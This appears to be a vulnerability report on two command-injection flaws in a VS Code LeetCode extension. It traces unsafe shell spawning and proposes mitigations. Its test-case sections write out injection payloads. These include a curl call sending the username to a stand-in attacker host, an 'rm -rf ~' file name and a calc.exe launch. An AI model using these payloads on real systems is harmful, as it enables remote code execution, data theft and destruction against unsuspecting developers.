# Vulnerabilities in VS Code LeetCode Extension

## Vulnerability 1: Command Injection in Test Functionality

### Description
This vulnerability allows remote code execution (RCE) via command injection through malicious test cases. When a user runs a test case, the test string is inadequately sanitized before being passed to `executeCommand`. 

Steps to trigger:
1. Create a malicious LeetCode repository with a carefully crafted test case
2. Convince a victim to open this repository in VS Code with the LeetCode extension installed
3. When the victim tests a solution using the malicious test case, the injected commands will execute on their machine

### Impact
Critical impact. An attacker can execute arbitrary commands with the privileges of the VS Code user, potentially leading to full system compromise, data theft, or further exploitation.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The code attempts to wrap test strings in quotes based on the operating system:
```typescript
// From src/commands/test.ts
function parseTestString(test: string): string {
    if (wsl.useWsl() || !isWindows()) {
        return `'${test}'`;
    }
    // In windows and not using WSL
    if (usingCmd()) {
        return `"${test.replace(/"/g, '\\"')}"`;
    } else {
        // Assume using PowerShell
        return `'${test.replace(/"/g, '\\"')}'`;
    }
}
```
However, this is insufficient as the quotes can be escaped or broken out of.

### Missing Mitigations
- Input validation to reject test cases containing dangerous characters
- Use of a safer API than direct command execution
- Use of proper command argument passing instead of string concatenation

### Preconditions
- The victim must have the VS Code LeetCode extension installed
- The victim must open a malicious LeetCode repository
- The victim must run a test using the malicious test case

### Source Code Analysis
The vulnerability lies in the command execution flow. Let's trace it:

1. In `src/commands/test.ts`, when a user inputs a test case, it's processed by `parseTestString()` which attempts to wrap it in quotes
2. This test string is then passed to `leetCodeExecutor.testSolution()`
3. In `src/leetCodeExecutor.ts`, the `testSolution` method passes the string to `executeCommandWithProgressEx`:
```typescript
public async testSolution(filePath: string, testString?: string): Promise<string> {
    if (testString) {
        return await this.executeCommandWithProgressEx("Submitting to LeetCode...", this.nodeExecutable, [await this.getLeetCodeBinaryPath(), "test", `"${filePath}"`, "-t", `${testString}`]);
    }
    // ...
}
```
4. This eventually calls `executeCommand` in `src/utils/cpUtils.ts`:
```typescript
export async function executeCommand(command: string, args: string[], options: cp.SpawnOptions = { shell: true }): Promise<string> {
    // ...
    const childProc: cp.ChildProcess = cp.spawn(command, args, { ...options, env: createEnvOption() });
    // ...
}
```

The critical issue is that:
1. The `shell: true` option is used by default, making it vulnerable to shell metacharacters
2. On Unix-like systems (or WSL), a test string like `'||touch /tmp/pwned||'` could execute `touch /tmp/pwned`
3. Even with the quotes added by `parseTestString()`, a malicious string can break out of them

### Security Test Case
1. Set up a LeetCode repository with a problem file
2. Create a test case with the following content for Unix/Linux/WSL systems:
   ```
   '||curl -s http://attacker.com/$(whoami)||'
   ```
3. For Windows systems with PowerShell:
   ```
   '`; Start-Process calc.exe; `'
   ```
4. Convince a victim to open this repository in VS Code
5. When the victim runs the test case, the injected command will execute

## Vulnerability 2: Command Injection in File Path Handling

### Description
This vulnerability allows arbitrary command execution by manipulating file paths that are passed to command execution functions. The extension directly incorporates file paths into shell commands without proper escaping.

Steps to trigger:
1. Create a malicious LeetCode repository with a crafted problem file that has a special filename
2. When the victim submits this solution, the path is passed to a shell command without proper sanitization

### Impact
Critical impact. An attacker can execute arbitrary commands with the privileges of the VS Code user, potentially leading to full system compromise, data theft, or further exploitation.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The code attempts to wrap file paths in quotes:
```typescript
// From src/leetCodeExecutor.ts
public async submitSolution(filePath: string): Promise<string> {
    try {
        return await this.executeCommandWithProgressEx("Submitting to LeetCode...", this.nodeExecutable, [await this.getLeetCodeBinaryPath(), "submit", `"${filePath}"`]);
    } catch (error) {
        if (error.result) {
            return error.result;
        }
        throw error;
    }
}
```
However, simple quoting is insufficient for properly sanitizing paths.

### Missing Mitigations
- Path sanitization to strip or escape shell metacharacters
- Validation of file paths to ensure they don't contain dangerous characters
- Use of safer APIs for file operations

### Preconditions
- The victim must have the VS Code LeetCode extension installed
- The victim must open a malicious LeetCode repository with a specially crafted filename
- The victim must submit or test the solution

### Source Code Analysis
The vulnerability exists in the way file paths are handled:

1. In various commands like `submitSolution`, file paths are directly incorporated into commands:
```typescript
// From src/leetCodeExecutor.ts
public async submitSolution(filePath: string): Promise<string> {
    try {
        return await this.executeCommandWithProgressEx("Submitting to LeetCode...", this.nodeExecutable, [await this.getLeetCodeBinaryPath(), "submit", `"${filePath}"`]);
    } catch (error) {
        if (error.result) {
            return error.result;
        }
        throw error;
    }
}
```

2. These commands are eventually executed via `executeCommand` in `src/utils/cpUtils.ts`:
```typescript
export async function executeCommand(command: string, args: string[], options: cp.SpawnOptions = { shell: true }): Promise<string> {
    // ...
    const childProc: cp.ChildProcess = cp.spawn(command, args, { ...options, env: createEnvOption() });
    // ...
}
```

The key issue is that:
1. The file path is wrapped in quotes but not properly escaped
2. With `shell: true`, shell metacharacters in the path could break out of the quotes and inject commands
3. A filename like `test";rm -rf ~;"` would be interpreted as multiple commands

### Security Test Case
1. Create a LeetCode repository with a problem file that has a malicious filename:
   - For Unix/Linux/WSL: `solution";curl -s http://attacker.com/$(whoami);".js`
   - For Windows: `solution";start calc;".js`
2. Convince a victim to open this repository in VS Code
3. When the victim submits or tests this solution, the injected command will execute